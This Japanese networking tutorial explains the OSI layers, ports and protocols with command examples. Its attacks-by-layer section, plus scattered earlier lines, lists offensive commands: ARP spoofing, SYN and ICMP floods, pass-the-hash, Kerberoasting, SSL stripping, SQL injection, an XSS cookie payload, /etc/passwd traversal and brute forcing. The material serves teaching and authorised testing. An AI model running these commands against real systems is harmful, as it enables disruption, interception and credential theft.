# OSIモデル

> **LearnCybersecurity** | ネットワーク基礎シリーズ
> 最終更新: 2026年 | 著者: kodoktheGr3at

---

<!-- LC-CURRICULUM-START -->
> **カリキュラムID:** `LC-038` | **フェーズ2:** ネットワーキング
> **想定学習時間:** 6〜8時間 | **レベル:** 初級
> **前提科目:** LC-005
> **書籍対応:** Kurose & Ross, Computer Networking 第1-2章、Stallings, Network Security Essentials 第2章
<!-- LC-CURRICULUM-END -->

## 目次

1. 概要: OSIモデルとは何か
2. レイヤー1: Physical
3. レイヤー2: Data Link
4. レイヤー3: Network
5. レイヤー4: Transport
6. レイヤー5: Session
7. レイヤー6: Presentation
8. レイヤー7: Application
9. データのカプセル化
10. TCPとUDPの比較
11. 主要なポート
12. 各層のプロトコル
13. 各層のネットワーク機器
14. セキュリティノート: 層ごとの攻撃
15. 実践的なワークフロー: ネットワーク偵察と分析

---

## 1. 概要: OSIモデルとは何か

OSIモデル（Open Systems Interconnection Model）は、ネットワーク通信システムがどのように機能するかを定義する標準化された概念フレームワークであり、7つの層に分かれている。1984年にISO（国際標準化機構）によって策定された。

各層は特定の役割を持ち、直上と直下の層とのみやり取りする。このモデルはあくまで参照用のものであり、実際の実装では通常TCP/IPモデル（4層）が使われる。それでもOSIは、ネットワークの理解、トラブルシューティング、分析のための標準として使われ続けている。

サイバーセキュリティにとって重要な理由:

- 攻撃がどの層で発生するかを理解することは、攻撃ベクターの特定に役立つ。
- データのカプセル化を理解することは、パケット分析やネットワークフォレンジクスを支える。
- 各層のプロトコルを知ることは、ファイアウォールやIDS/IPSの設定に役立つ。
- ネットワーク機器を理解することは、ネットワークペンテストや偵察を支える。
- 異常なトラフィックを分析することは、脅威ハンティングやインシデントレスポンスを支える。

### OSIモデルの全体像

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          OSI MODEL (7 Layers)                           │
├───────┬──────────────────┬────────────────────────────────────────────┤
│ Layer │   Name           │  Key Responsibilities                       │
├───────┼──────────────────┼────────────────────────────────────────────┤
│   7   │  Application     │  User-facing protocols (HTTP, FTP, DNS)    │
│   6   │  Presentation    │  Encoding, encryption, compression         │
│   5   │  Session         │  Connection management, authentication     │
│   4   │  Transport       │  TCP/UDP, ports, flow control              │
│   3   │  Network         │  IP addressing, routing                    │
│   2   │  Data Link       │  MAC addresses, switches, frames           │
│   1   │  Physical        │  Cables, signals, bits                     │
└───────┴──────────────────┴────────────────────────────────────────────┘

                    Data Unit (PDU) per Layer:
┌─────────────────────────────────────────────────┐
│  Layer 7 — Application   →  Data                │
│  Layer 6 — Presentation  →  Data                │
│  Layer 5 — Session       →  Data                │
│  Layer 4 — Transport     →  Segment (TCP)        │
│                             Datagram (UDP)        │
│  Layer 3 — Network       →  Packet              │
│  Layer 2 — Data Link     →  Frame               │
│  Layer 1 — Physical      →  Bits (0s and 1s)    │
└─────────────────────────────────────────────────┘

層の順序（上から下）を覚えるための語呂合わせ（英語）:
  "All People Seem To Need Data Processing"
```

---

## 2. レイヤー1: Physical

物理層はOSIモデルの最下層である。物理媒体を通じて生のビット（0と1）を伝送する役割を担う。この層はデータの意味を気にせず、電気、光、または電波信号を一点から別の点へ移動させるだけである。

主要コンポーネント:

- ケーブル（イーサネット、光ファイバー、同軸）
- 電気信号、光、または電波
- 物理コネクタとポート（RJ45、SFP、BNC）
- リピーターとハブ機器

```bash
# Physical layer related commands

# Check network interface status (link up/down = physical layer)
$ ip link show
$ ifconfig
$ ethtool eth0          # NIC speed, duplex, link status

# Windows equivalent
> ipconfig /all
> Get-NetAdapter         # PowerShell

# Check cable / physical connection
$ ethtool eth0 | grep "Link detected"
Link detected: yes

# Check interface errors (physical issues)
$ ip -s link show eth0
$ netstat -i
$ cat /proc/net/dev

# Wireshark — capture at physical/data link level
$ tcpdump -i eth0 -n    # capture raw frames
$ wireshark             # GUI packet capture
```

| メディア | 速度 | 最大距離 |
|---------|------|----------|
| Cat5e UTP | 1 Gbps | 100メートル |
| Cat6 UTP | 10 Gbps | 55メートル |
| 光ファイバー（シングルモード） | 100 Gbps以上 | 40〜80 km |
| 光ファイバー（マルチモード） | 10 Gbps | 550メートル |
| Wi-Fi 6（802.11ax） | 9.6 Gbps | 約100メートル |

---

## 3. レイヤー2: Data Link

データリンク層は、同一ネットワークセグメント内で直接接続された2つのノード間の信頼できるデータ転送を担当する。この層はデバイスを識別するためにMACアドレス（Media Access Control）を使い、物理メディアへのアクセスを管理する。

この層は2つのサブレイヤーに分かれる。

- LLC（Logical Link Control）: フロー制御とエラーチェック
- MAC（Media Access Control）: 物理アドレッシングとメディアアクセス

```bash
# Data Link layer commands

# View MAC addresses
$ ip link show
$ arp -a                  # ARP table (IP ↔ MAC mapping)
$ arp -n

# Windows
> arp -a
> getmac /v

# ARP spoofing detection (Wireshark filter)
# Filter: arp.duplicate-address-detected
# Filter: arp.src.hw_mac != eth.src

# Send raw Ethernet frames (Layer 2) with Scapy (Python)
$ python3
>>> from scapy.all import *
>>> frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
>>> sendp(frame, iface="eth0")

# View switch MAC address table (if you have access)
# Cisco: show mac address-table
# Linux bridge: bridge fdb show

# 802.1Q VLAN tagging
$ ip link add link eth0 name eth0.100 type vlan id 100
$ ip addr add 192.168.100.1/24 dev eth0.100

# Capture Layer 2 traffic
$ tcpdump -e -i eth0      # -e shows MAC addresses
```

| プロトコル | 機能 | ペンテストでの重要度 |
|-----------|------|------------------------|
| ARP | IPからMACへの解決 | Critical（ARPスプーフィング） |
| Ethernet II | 標準LANフレーム | Medium |
| 802.1Q | VLANタグ付け | High（VLANホッピング） |
| STP（802.1D） | ネットワークループの防止 | High（STP攻撃） |
| PPP | ポイントツーポイントリンク | Low |

---

## 4. レイヤー3: Network

ネットワーク層はルーティングと論理アドレッシング（IPアドレス）を担当する。複数の異なるネットワークを越えて、送信元から宛先へデータパケットを届ける最適な経路を決定する。この層の主要機器はルーターである。

この層のデータ単位はパケットと呼ばれる。

```bash
# Network layer commands

# IP addressing
$ ip addr show
$ ip addr add 192.168.1.10/24 dev eth0

# Routing table
$ ip route show
$ route -n
$ netstat -rn

# Windows
> route print
> Get-NetRoute

# Ping — ICMP echo (Layer 3 reachability test)
$ ping 8.8.8.8
$ ping -c 4 192.168.1.1   # 4 packets only

# Traceroute — show routing path
$ traceroute 8.8.8.8       # Linux/Mac
> tracert 8.8.8.8          # Windows
$ mtr 8.8.8.8              # real-time traceroute

# IP Subnet calculations
$ ipcalc 192.168.1.0/24
$ python3 -c "import ipaddress; print(list(ipaddress.IPv4Network('10.0.0.0/28').hosts()))"

# Wireshark filter for IP layer
# ip.addr == 192.168.1.1
# ip.src == 10.0.0.0/8
# icmp

# Nmap — Layer 3/4 scanning
$ nmap -sn 192.168.1.0/24         # Ping sweep (host discovery)
$ nmap -sP 192.168.1.0/24         # ARP + ICMP discovery
$ nmap -O 192.168.1.1             # OS detection (TTL analysis)
```

| プロトコル | 機能 | ペンテストでの重要度 |
|-----------|------|------------------------|
| IPv4 | 32ビットアドレッシング | High |
| IPv6 | 128ビットアドレッシング | High |
| ICMP | 制御・エラーメッセージ | High（ICMPフラッド） |
| OSPF | 動的ルーティングプロトコル | Medium |
| BGP | AS間ルーティング | High（BGPハイジャック） |
| IPSec | IPの暗号化と認証 | Low |

---

## 5. レイヤー4: Transport

トランスポート層は、異なるホスト上のアプリケーション間のエンドツーエンド通信を担当する。通信するサービス/アプリケーションを識別するためにポート番号を使い、フロー制御、エラー回復、データセグメンテーションの仕組みを提供する。

主要な2つのプロトコル:

- TCP（Transmission Control Protocol）: 接続指向、信頼性あり、順序保証あり
- UDP（User Datagram Protocol）: コネクションレス、高速、配送保証なし

```bash
# Transport layer commands

# View open ports & connections
$ ss -tulnp               # preferred (modern)
$ netstat -tulnp           # traditional
$ netstat -ano             # Windows

# Windows PowerShell
PS> Get-NetTCPConnection
PS> Get-NetUDPEndpoint

# TCP 3-way handshake (SYN-SYN/ACK-ACK)
# Wireshark filter: tcp.flags.syn==1
# Wireshark filter: tcp.stream eq 0

# Port scanning with Nmap
$ nmap -sT 192.168.1.1         # TCP connect scan (full handshake)
$ nmap -sS 192.168.1.1         # SYN stealth scan (half-open)
$ nmap -sU 192.168.1.1         # UDP scan
$ nmap -p 80,443,8080 192.168.1.1   # specific ports
$ nmap -p- 192.168.1.1         # all 65535 ports
$ nmap -sV 192.168.1.1         # service version detection

# Netcat — TCP/UDP raw connections
$ nc -lvnp 4444               # listen (attacker)
$ nc 192.168.1.10 4444        # connect (victim → attacker)
$ nc -u 192.168.1.1 53        # UDP mode
$ nc -zv 192.168.1.1 22       # port check (banner grab)

# Banner grabbing
$ nc -nv 192.168.1.1 80
HEAD / HTTP/1.0

# Check for SYN flood (DoS attack detection)
$ netstat -an | grep SYN_RECV | wc -l
```

### TCPとUDPの比較

| 特徴 | TCP | UDP |
|------|-----|-----|
| 接続 | 接続指向（3ウェイハンドシェイク） | コネクションレス |
| 信頼性 | 保証あり、ACKを使う | 保証なし、送りっぱなし |
| 順序 | 順序保証あり | 順序が入れ替わることがある |
| 速度 | 遅い（オーバーヘッドあり） | 速い |
| 用途 | HTTP、SSH、FTP、メール | DNS、DHCP、VoIP、動画ストリーミング |

### TCP 3ウェイハンドシェイク

```
Client                          Server
  │                               │
  │──── SYN (seq=100) ───────────>│   Step 1: Client initiates
  │                               │
  │<─── SYN+ACK (seq=200,ack=101)─│   Step 2: Server acknowledges + syncs
  │                               │
  │──── ACK (ack=201) ───────────>│   Step 3: Client acknowledges
  │                               │
  │<════ DATA TRANSFER ══════════>│   Connection established!
  │                               │
  │──── FIN ─────────────────────>│   Step 4: Teardown (4-way)
  │<─── ACK ──────────────────────│
  │<─── FIN ──────────────────────│
  │──── ACK ─────────────────────>│   Connection closed
```

---

## 6. レイヤー5: Session

セッション層は、アプリケーション間の通信セッションの確立、管理、終了を担当する。接続が中断された場合に、適切な場所からセッションを再開できるようにする（チェックポイント）。またダイアログ制御（半二重 対 全二重）も管理する。

```bash
# Session layer examples

# NetBIOS — Session Layer protocol (Windows networking)
$ nmblookup -A 192.168.1.1    # NetBIOS name lookup
$ nbtscan 192.168.1.0/24      # scan for NetBIOS names

# RPC (Remote Procedure Call) — Session layer
$ rpcinfo -p 192.168.1.1      # list RPC services
$ showmount -e 192.168.1.1    # NFS shares (uses RPC)

# SMB Session (Windows file sharing)
$ smbclient -L //192.168.1.1  # list SMB shares
$ smbclient //192.168.1.1/share -U username

# Session hijacking detection (Wireshark)
# Filter: tcp.seq or unexpected RST packets
# Look for duplicate SEQ numbers

# SQL*Net (Oracle DB sessions) — port 1521
# iSCSI sessions — port 3260

# SSH — manages sessions with keep-alive
$ ssh -o ServerAliveInterval=60 user@host
```

| プロトコル | 機能 | ペンテストでの重要度 |
|-----------|------|------------------------|
| NetBIOS | Windowsの名前解決サービス | High |
| RPC | リモートプロシージャコール | High |
| SMB | Windowsファイル共有 | Critical |
| SQL*Net | OracleDBセッション | Medium |
| iSCSI | ネットワーク越しのストレージ | Medium |

---

## 7. レイヤー6: Presentation

プレゼンテーション層はネットワークの「翻訳者」である。データフォーマット、暗号化/復号、圧縮を担当する。内部フォーマットが異なっていても、あるアプリケーションが送ったデータを別のアプリケーションが読めるようにする。

主な責任:

- エンコード/デコード: ASCII、Unicode、EBCDIC
- 暗号化/復号: SSL/TLSがここで動作する
- 圧縮/解凍: gzip、zlib

```bash
# Presentation layer — encoding, encryption, compression

# Base64 encoding/decoding
$ echo "Hello World" | base64
SGVsbG8gV29ybGQK
$ echo "SGVsbG8gV29ybGQK" | base64 -d
Hello World

# URL encoding
$ python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
hello%20world

# SSL/TLS certificate inspection (HTTPS = TLS at Presentation layer)
$ openssl s_client -connect google.com:443
$ openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text

$ curl -v https://google.com 2>&1 | grep -E "SSL|TLS|cipher"

# Check SSL/TLS version & ciphers (pentesting)
$ nmap --script ssl-enum-ciphers -p 443 target.com
$ sslscan target.com
$ testssl.sh target.com

# Identify file encoding/format
$ file suspicious.bin
$ xxd suspicious.bin | head -20     # hex dump
$ strings suspicious.bin | head -20  # extract strings

# Common encoding conversions (Python)
$ python3 -c "
data = 'Hello'
print('Base64:', __import__('base64').b64encode(data.encode()).decode())
print('Hex:', data.encode().hex())
print('URL:', __import__('urllib.parse').quote(data))
"
```

| フォーマット / プロトコル | 機能 | ペンテストでの重要度 |
|--------------------------|------|------------------------|
| SSL/TLS | トランスポート暗号化 | High（SSLstrip、ダウングレード） |
| ASCII/Unicode | テキストエンコーディング | Medium |
| Base64 | バイナリからテキストへのエンコーディング | High（ペイロードの難読化） |
| gzip/zlib | データ圧縮 | Low |
| JPEG/PNG/GIF | 画像フォーマット | Medium（ステガノグラフィ） |
| MIME | メールのマルチパートフォーマット | Medium |

---

## 8. レイヤー7: Application

アプリケーション層はOSIモデルの最上層であり、エンドユーザーと直接やり取りする唯一の層である。アプリケーションとネットワークの間のインターフェースを提供し、アプリケーションが通信に使うプロトコルを定義する。

> 注: アプリケーション層はアプリケーション自体（ChromeやFirefoxなど）を意味しない。それらのアプリケーションが使うネットワークプロトコルのことを指す。

```bash
# Application layer — common protocols & tools

# HTTP / HTTPS
$ curl -v http://target.com                  # verbose HTTP request
$ curl -X POST -d "user=admin&pass=123" http://target.com/login
$ wget http://target.com/file.txt

# DNS — Domain Name System
$ dig google.com                             # full DNS lookup
$ dig google.com A                           # IPv4 record
$ dig google.com MX                          # Mail exchange
$ dig google.com NS                          # Name servers
$ dig @8.8.8.8 google.com                   # use specific DNS server
$ host google.com
$ nslookup google.com

# DNS zone transfer (pentesting!)
$ dig axfr @ns1.target.com target.com
$ fierce --domain target.com                # DNS brute force

# FTP
$ ftp 192.168.1.1
$ ftp -n 192.168.1.1 <<EOF
  user anonymous ""
  ls
  bye
EOF

# SSH
$ ssh user@192.168.1.1
$ ssh -p 2222 user@192.168.1.1              # non-default port
$ ssh -L 8080:internal:80 user@bastion      # local port forward
$ ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel

# SMTP — Email
$ nc -v mail.target.com 25
EHLO test.com
VRFY admin@target.com                       # user enumeration!

# SNMP — Network Management
$ snmpwalk -c public -v 2c 192.168.1.1     # community string: public
$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1

# Application layer scanning (Nmap scripts)
$ nmap --script http-title -p 80,443 192.168.1.0/24
$ nmap --script http-robots.txt target.com
$ nmap --script smtp-enum-users target.com
$ nmap --script dns-brute target.com
$ nmap --script ftp-anon target.com         # anonymous FTP check
$ nmap --script smb-vuln-* 192.168.1.1     # SMB vulnerabilities
```

| プロトコル | ポート | 機能 | ペンテストでの重要度 |
|-----------|--------|------|------------------------|
| HTTP | 80 | 非暗号化Web | High |
| HTTPS | 443 | 暗号化Web | High |
| DNS | 53 | ドメイン名解決 | High |
| FTP | 21 | ファイル転送（平文） | Critical |
| SSH | 22 | セキュアシェル | High |
| Telnet | 23 | 非セキュアなシェル | Critical |
| SMTP | 25 | メール送信 | High |
| POP3 | 110 | メール取得 | Medium |
| IMAP | 143 | メール管理 | Medium |
| SNMP | 161 | ネットワーク管理 | High |
| LDAP | 389 | ディレクトリサービス | High |
| RDP | 3389 | リモートデスクトップ | Critical |
| SMB | 445 | Windowsファイル共有 | Critical |
| MSSQL | 1433 | SQL Server | High |
| MySQL | 3306 | MySQLデータベース | High |
| RPC | 135 | リモートプロシージャコール | High |

---

## 9. データのカプセル化

カプセル化とは、各OSI層が下の層に渡す前にデータへヘッダー（時にはトレーラーも）を追加していくプロセスである。逆のプロセスはデカプセル化と呼ばれ、受信側で行われる。

```
Sender (Encapsulation)                    Receiver (De-encapsulation)
──────────────────────────────────────────────────────────────────────

Layer 7 — Application                     Layer 7 — Application
┌─────────────────────────┐               ┌─────────────────────────┐
│         DATA            │               │         DATA            │
└─────────────────────────┘               └─────────────────────────┘
            ↓ Add L7 header                           ↑ Remove L7 header

Layer 6 — Presentation                    Layer 6 — Presentation
┌──────┬──────────────────┐               ┌──────┬──────────────────┐
│  L6H │       DATA       │               │  L6H │       DATA       │
└──────┴──────────────────┘               └──────┴──────────────────┘
            ↓ Add L5 header                           ↑ Remove L5 header

Layer 5 — Session                         Layer 5 — Session
┌───┬──┬──────────────────┐               ┌───┬──┬──────────────────┐
│L5H│L6│       DATA       │               │L5H│L6│       DATA       │
└───┴──┴──────────────────┘               └───┴──┴──────────────────┘
            ↓ Add TCP/UDP header                       ↑ Remove L4 header

Layer 4 — Transport     [SEGMENT]         Layer 4 — Transport
┌─────────────┬───────────────────────┐   ┌─────────────┬──────────┐
│  TCP Header │     DATA (Payload)    │   │  TCP Header │  Data    │
│ src/dst port│                       │   └─────────────┴──────────┘
└─────────────┴───────────────────────┘
            ↓ Add IP header                            ↑ Remove IP header

Layer 3 — Network       [PACKET]          Layer 3 — Network
┌──────────┬──────────────────────────┐   ┌──────────┬─────────────┐
│ IP Header│   TCP Header + Data      │   │ IP Header│    Data     │
│ src/dst IP│                         │   └──────────┴─────────────┘
└──────────┴──────────────────────────┘
            ↓ Add MAC header + trailer                 ↑ Remove MAC frame

Layer 2 — Data Link     [FRAME]           Layer 2 — Data Link
┌──────────┬────────────────────┬──────┐  ┌──────────┬──────┬──────┐
│MAC Header│ IP + TCP + Data    │FCS   │  │MAC Header│ Data │ FCS  │
│src/dst MAC│                  │(CRC) │  └──────────┴──────┴──────┘
└──────────┴────────────────────┴──────┘
            ↓ Convert to bits                          ↑ Convert from bits

Layer 1 — Physical      [BITS]            Layer 1 — Physical
  01001000 01100101 01101100 01101100 ...   01001000 01100101 ...

                    ──── Physical medium ────>
```

---

## 10. TCPとUDPの比較

```bash
# TCP connection analysis
$ tcpdump -i eth0 'tcp and host 192.168.1.1'

# Wireshark filters — TCP
# tcp.flags.syn == 1 and tcp.flags.ack == 0   → SYN (new connections)
# tcp.flags.fin == 1                          → FIN (connection closing)
# tcp.flags.rst == 1                          → RST (reset / port closed)
# tcp.analysis.retransmission                 → retransmissions (packet loss)

# Wireshark filters — UDP
# udp.port == 53     → DNS traffic
# udp.port == 67     → DHCP server
# udp.port == 68     → DHCP client

# Test TCP vs UDP response
$ nmap -sT 192.168.1.1 -p 80   # TCP
$ nmap -sU 192.168.1.1 -p 53   # UDP

# UDP flood detection
$ netstat -su    # UDP statistics (errors = possible flood)
```

| 項目 | TCP | UDP |
|------|-----|-----|
| PDU名 | Segment | Datagram |
| ヘッダーサイズ | 20〜60バイト | 8バイト |
| ハンドシェイク | 3ウェイ（SYN/SYN-ACK/ACK） | なし |
| 信頼性 | あり | なし |
| 順序保証 | あり（シーケンス番号） | なし |
| フロー制御 | あり（ウィンドウ制御） | なし |
| エラー回復 | あり（再送） | なし |
| 速度 | 遅い | 速い |
| ブロードキャスト | 不可 | 可能 |
| マルチキャスト | 不可 | 可能 |
| 用途 | HTTP、SSH、FTP、SMTP | DNS、DHCP、VoIP、ゲーム |

---

## 11. 主要なポート

ポートはホスト内の特定のサービスやアプリケーションを識別する論理番号（0〜65535）である。3つのカテゴリがある。

- Well-knownポート（0〜1023）: 標準化されており、root権限が必要
- Registeredポート（1024〜49151）: IANAに登録済み
- Dynamic/privateポート（49152〜65535）: 一時的に使用される

```bash
# Port scanning cheatsheet

# Quick common ports scan
$ nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 target

# Top 1000 ports (default nmap)
$ nmap target

# All ports
$ nmap -p- target

# Service version + OS detection + scripts
$ nmap -sV -O -sC target

# Aggressive scan (combine all)
$ nmap -A target

# Fast scan
$ nmap -F target

# Check if specific port is open with nc
$ nc -zv target.com 22       # SSH
$ nc -zv target.com 3389     # RDP
$ nc -zv target.com 445      # SMB
```

### 重要ポート早見表

| ポート | プロトコル | サービス | ペンテストリスク | メモ |
|--------|-----------|----------|---------------------|------|
| 21 | TCP | FTP | Critical | 平文、匿名ログイン |
| 22 | TCP | SSH | High | ブルートフォース、鍵認証 |
| 23 | TCP | Telnet | Critical | 平文、非推奨 |
| 25 | TCP | SMTP | High | ユーザー列挙、リレー悪用 |
| 53 | TCP/UDP | DNS | High | ゾーン転送、DNSポイズニング |
| 67/68 | UDP | DHCP | High | 不正DHCP、starvation攻撃 |
| 80 | TCP | HTTP | High | Web攻撃、SQLi、XSS |
| 88 | TCP/UDP | Kerberos | Critical | AS-REP Roasting、Kerberoasting |
| 110 | TCP | POP3 | Medium | 平文の認証情報 |
| 111 | TCP/UDP | RPC/rpcbind | High | NFSの列挙 |
| 135 | TCP | MS-RPC | High | DCOM攻撃 |
| 139 | TCP | NetBIOS | High | SMB、nullセッション |
| 143 | TCP | IMAP | Medium | 平文の認証情報 |
| 161/162 | UDP | SNMP | High | コミュニティ文字列、情報漏洩 |
| 389 | TCP | LDAP | High | AD列挙、nullバインド |
| 443 | TCP | HTTPS | High | HTTPS経由のWeb攻撃 |
| 445 | TCP | SMB | Critical | EternalBlue、pass-the-hash |
| 512/513/514 | TCP | r-services | Critical | 認証なし、レガシー |
| 873 | TCP | rsync | High | 未認証でのファイルアクセス |
| 993 | TCP | IMAPS | Low | 暗号化済み |
| 995 | TCP | POP3S | Low | 暗号化済み |
| 1433 | TCP | MSSQL | High | SAアカウント、xp_cmdshell |
| 1521 | TCP | Oracle DB | High | デフォルトSID |
| 2049 | TCP/UDP | NFS | High | 未認証マウント、root squash |
| 3306 | TCP | MySQL | High | rootにパスワードなし |
| 3389 | TCP | RDP | Critical | BlueKeep、ブルートフォース |
| 5432 | TCP | PostgreSQL | High | デフォルト認証情報 |
| 5900 | TCP | VNC | High | 弱い認証または認証なし |
| 6379 | TCP | Redis | Critical | 認証なし、設定経由のRCE |
| 8080 | TCP | HTTP-alt | High | 開発サーバー、管理パネル |
| 8443 | TCP | HTTPS-alt | High | 管理パネル |
| 27017 | TCP | MongoDB | Critical | デフォルトで認証なし |

---

## 12. 各層のプロトコル

```
┌───────────────────────────────────────────────────────────────────┐
│ LAYER 7 — APPLICATION                                             │
│  HTTP  HTTPS  FTP  SFTP  SSH  Telnet  DNS  DHCP  SMTP  POP3      │
│  IMAP  SNMP  LDAP  RDP  SMB  NFS  SIP  XMPP  MQTT  Gopher       │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 6 — PRESENTATION                                            │
│  SSL  TLS  ASCII  Unicode  JPEG  PNG  GIF  MPEG  MIDI            │
│  Base64  MIME  XDR  AFP  LPP                                     │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 5 — SESSION                                                 │
│  NetBIOS  RPC  PPTP  L2TP  SQL*Net  NFS  SMB (session mgmt)      │
│  iSCSI  SOCKS  PAP  CHAP  Diameter                               │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 4 — TRANSPORT                                               │
│  TCP  UDP  SCTP  DCCP  SPX  QUIC                                 │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 3 — NETWORK                                                 │
│  IPv4  IPv6  ICMP  ICMPv6  OSPF  BGP  EIGRP  RIP                │
│  IPSec  ARP*  RARP*  NAT  IGMP  GRE  MPLS                       │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 2 — DATA LINK                                               │
│  Ethernet  Wi-Fi (802.11)  PPP  HDLC  Frame Relay                │
│  ATM  802.1Q (VLAN)  STP  LACP  ARP  MAC                        │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 1 — PHYSICAL                                                │
│  Ethernet (cable specs)  USB  DSL  ISDN  T1/E1                   │
│  Bluetooth  802.11 (radio)  Fiber Optic standards                 │
└───────────────────────────────────────────────────────────────────┘

* ARP technically operates between Layer 2 and 3
```

---

## 13. 各層のネットワーク機器

それぞれのネットワーク機器は、特定のOSI層で動作する。これを理解することは、ネットワークセグメンテーション、トラブルシューティング、ネットワークレベルの攻撃を扱う上で重要である。

| OSI層 | 機器 | 機能 |
|-------|------|------|
| Layer 7 | アプリケーションファイアウォール、WAF、プロキシ、ロードバランサー | HTTPのフィルタリング、SSLインスペクション |
| Layer 4 | ステートフルファイアウォール、ロードバランサー | ポートと接続によるフィルタリング |
| Layer 3 | ルーター、L3スイッチ、ファイアウォール | ネットワーク間のルーティング |
| Layer 2 | L2スイッチ、ブリッジ、WAP | MACベースのスイッチング |
| Layer 1 | ハブ、リピーター、ケーブル、NIC、WAP | 物理信号の伝送 |

```bash
# Identify network devices during pentest

# Identify routers / gateways
$ ip route | grep default          # default gateway = router
$ arp -a                           # ARP table shows local devices

# Scan for specific devices
$ nmap -sV --version-intensity 5 192.168.1.0/24

# Identify switches (CDP/LLDP discovery)
$ nmap --script lldp-discovery 192.168.1.0/24
$ wireshark → filter: lldp or cdp

# WAF detection
$ wafw00f https://target.com
$ nmap --script http-waf-detect --script-args="http-waf-detect.aggro" target.com

# Load balancer detection
$ lbd target.com                   # Load balancer detector

# Proxy detection
$ curl -v --proxy-header target.com  # look for Via: header
```

---

## 14. セキュリティノート: OSI層ごとの攻撃

OSIの各層には、それぞれ固有の攻撃ベクターがある。攻撃がどの層で発生するかを理解することは、ディフェンダーが適切なセキュリティコントロールを配置する助けになり、アタッカーが効果的な手法を選ぶ助けにもなる。

> 教育的な注記: 以下のコマンドは、自分が所有する、または許可を得たネットワークでの正規のテストを想定している。この節は攻撃のカテゴリをそれぞれが動作する層に対応付けているのであって、自分が管理していないターゲットに対する手順書ではない。

```bash
# ── LAYER 1 ATTACKS ─────────────────────────────────────────────────

# Physical tapping / eavesdropping
# → Use encrypted protocols (HTTPS, SSH, VPN) to mitigate

# Evil twin Wi-Fi (physical signal)
$ airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# ── LAYER 2 ATTACKS ─────────────────────────────────────────────────

# ARP Spoofing / Poisoning — MITM at Layer 2
$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1     # poison victim
$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100     # poison gateway
$ echo 1 > /proc/sys/net/ipv4/ip_forward             # enable forwarding
# Or use:
$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
$ bettercap -iface eth0                               # modern MITM framework

# MAC Flooding — fill switch CAM table
$ macof -i eth0                   # flood switch with random MACs

# VLAN Hopping — 802.1Q double tagging
# Use tools like yersinia

# STP Attack — become root bridge
$ yersinia stp -attack 1 -interface eth0

# ── LAYER 3 ATTACKS ─────────────────────────────────────────────────

# ICMP Flood / Ping of Death
$ hping3 -1 --flood -V -a spoofed-ip target.com

# IP Spoofing
$ hping3 -a fake-source-ip target.com

# Smurf Attack (ICMP broadcast amplification)
# BGP Hijacking (requires BGP router access)

# Route poisoning
$ python3 -c "from scapy.all import *; send(IP(dst='router',proto=89)/OSPF_Hdr()/OSPF_Hello())"

# ── LAYER 4 ATTACKS ─────────────────────────────────────────────────

# SYN Flood — exhaust server connections
$ hping3 -S --flood -V -p 80 target.com
$ hping3 -S -P -U --flood -V -p 80 target.com

# Port scanning (reconnaissance)
$ nmap -sS -p- target.com

# TCP Session Hijacking
# → Requires MITM position + sequence number prediction

# UDP Flood
$ hping3 --udp --flood target.com -p 53

# ── LAYER 5 ATTACKS ─────────────────────────────────────────────────

# Session Hijacking — steal session tokens
# → Intercept cookies via HTTP (Wireshark / BetterCAP)

# Pass-the-Hash (Windows NTLM)
$ pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe
$ impacket-psexec domain/user@target -hashes :NTLM_HASH

# Kerberoasting (Kerberos ticket attack)
$ impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request

# ── LAYER 6 ATTACKS ─────────────────────────────────────────────────

# SSL Stripping — downgrade HTTPS to HTTP
$ bettercap -iface eth0
> set https.proxy.sslstrip true
> https.proxy on

# TLS Downgrade Attack
$ nmap --script ssl-dh-params target.com   # check for LOGJAM
$ nmap --script ssl-poodle target.com      # POODLE attack check

# Certificate spoofing / Invalid cert bypass
$ mitmproxy --ssl-insecure                 # intercept SSL
$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

# ── LAYER 7 ATTACKS ─────────────────────────────────────────────────

# SQL Injection
$ sqlmap -u "http://target.com/page?id=1" --dbs
$ sqlmap -u "http://target.com/" --forms --dbs --level=5

# Cross-Site Scripting (XSS)
# Test: <script>alert(document.cookie)</script>

# Directory Traversal
$ curl "http://target.com/../../etc/passwd"

# HTTP brute force
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# DNS Zone Transfer
$ dig axfr @ns1.target.com target.com

# SMTP User Enumeration
$ smtp-user-enum -M VRFY -U users.txt -t target.com

# SNMP Enumeration
$ snmpwalk -c public -v 2c target.com

# SMB Exploitation
$ impacket-psexec administrator:password@target.com
$ metasploit → use exploit/windows/smb/ms17_010_eternalblue
```

### OSI攻撃まとめ表

| 層 | 一般的な攻撃 | 防御策 |
|----|--------------|--------|
| 7 — Application | SQLi、XSS、RCE、CSRF、フィッシング | WAF、入力検証、パッチ適用 |
| 6 — Presentation | SSLストリッピング、TLSダウングレード、証明書偽装 | HSTS、証明書ピンニング、TLS 1.3以降 |
| 5 — Session | セッションハイジャック、pass-the-hash、Kerberoasting | トークンのローテーション、MFA、Kerberosのハードニング |
| 4 — Transport | SYNフラッド、ポートスキャン、UDPフラッド | SYN cookie、レート制限、ファイアウォール |
| 3 — Network | IPスプーフィング、ICMPフラッド、ルートポイズニング | uRPF、ACL、ICMPのレート制限 |
| 2 — Data Link | ARPスプーフィング、MACフラッド、VLANホッピング | Dynamic ARP Inspection、ポートセキュリティ |
